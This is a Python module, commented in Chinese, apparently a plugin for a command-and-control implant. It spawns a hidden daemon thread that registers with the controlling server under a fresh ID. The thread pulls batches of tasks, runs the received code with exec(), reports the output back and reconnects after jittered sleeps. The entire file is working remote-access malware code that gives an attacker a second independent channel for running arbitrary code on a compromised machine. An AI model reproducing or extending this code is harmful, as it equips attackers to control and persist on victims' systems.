"""fork — 分裂出独立回连的 beacon 线程（break 单独退出）。

执行后开一个 daemon 线程，用【新 ID】独立注册回连（server 视为新
beacon：独立队列、独立结果）。分裂线程与主进程互不影响：
  - break 任务设置 _FORK_BREAK=True → 分裂线程循环退出（线程结束）
  - 主 beacon 循环检查 _B，不检查 _FORK_BREAK → 主进程不受影响

v2 批量模型: 与主模板同协议（register batch=true → 上报本地结果 →
fetch → 收 TASKS 批量任务 → pong 断开）；执行器用线程本地输出捕获
（_TLS.buf，与主模板 _run_one_task 同机制），不再重定向全局 stdout。

依赖 beacon 全局（模板短名契约）: _T/_D/js/io_/tb/tm/sec/thr/
send_frame/recv_frame/sleep_jitter/_TLS
"""

import threading as _th

MODULE = {
    "desc": "分裂出独立回连的 beacon 线程（break 单独退出）",
    "params": [],
}


def run():
    """启动分裂线程并立即返回（主 beacon 继续正常轮询）。"""
    G = globals()
    G["_FORK_BREAK"] = False
    G.setdefault("_FORK_PENDING", {})          # task_id -> (output, error)
    G.setdefault("_FORK_PENDING_LOCK", _th.Lock())
    cid = sec.token_hex(8)
    _th.Thread(target=_fork_cycle, args=(cid,), daemon=True).start()
    return f"(fork 已启动: {cid}，独立回连中)"


def _fork_cycle(cid):
    """分裂线程主循环：独立注册/上报结果/批量领取任务，检查 _FORK_BREAK。"""
    G = globals()
    G["_IN_FORK"] = True
    lock = G["_FORK_PENDING_LOCK"]
    try:
        while not G["_FORK_BREAK"]:
            try:
                t = _T()
                send_frame(t, js.dumps({"type": "register", "version": 2,
                                        "role": "beacon", "id": cid,
                                        "fork": True, "batch": True}).encode())
                while True:
                    u = js.loads(recv_frame(t).decode())
                    v = u.get("type")
                    if v == "welcome":
                        break
                    if v == "error":
                        raise ConnectionError("error frame")
                # ① 上报本地结果（逐条发 + 收确认）
                with lock:
                    pending = list(G["_FORK_PENDING"].items())
                for tid, res in pending:
                    send_frame(t, js.dumps({"type": "result", "task_id": tid,
                                            "output": res[0],
                                            "error": res[1]}).encode())
                    u = js.loads(recv_frame(t).decode())
                    if u.get("type") == "tasks":
                        for a in u.get("acked") or []:
                            with lock:
                                G["_FORK_PENDING"].pop(a, None)
                    else:
                        break
                # ② 领取批量任务并本地执行
                send_frame(t, js.dumps({"type": "fetch"}).encode())
                while not G["_FORK_BREAK"]:
                    u = js.loads(recv_frame(t).decode())
                    v = u.get("type")
                    if v == "tasks":
                        for tk in u.get("tasks") or []:
                            if G["_FORK_BREAK"]:
                                break
                            w, x = _fork_exec(tk.get("code", ""))
                            with lock:
                                G["_FORK_PENDING"][tk.get("task_id", "")] = (w, x)
                    elif v == "pong":
                        break
                    elif v == "error":
                        break
                t.close()
            except Exception:
                pass
            if not G["_FORK_BREAK"]:
                tm.sleep(sleep_jitter())
    finally:
        G["_IN_FORK"] = False


def _fork_exec(code):
    """分裂线程独立执行任务代码（线程本地输出捕获，与主模板同机制）。

    _TLS.buf 是线程本地变量：fork 线程设自己的 buffer，print 经
    _ThreadStream 路由到本线程 buffer，与主 beacon 并发任务互不污染。
    """
    o, e = io_.StringIO(), io_.StringIO()
    _TLS.buf = (o, e)
    try:
        exec(code, globals())
    except Exception:
        e.write(tb.format_exc())
    finally:
        _TLS.buf = None
    return o.getvalue(), e.getvalue()


if __name__ == "__main__":
    print("fork: 由 server 下发执行，不直接运行")
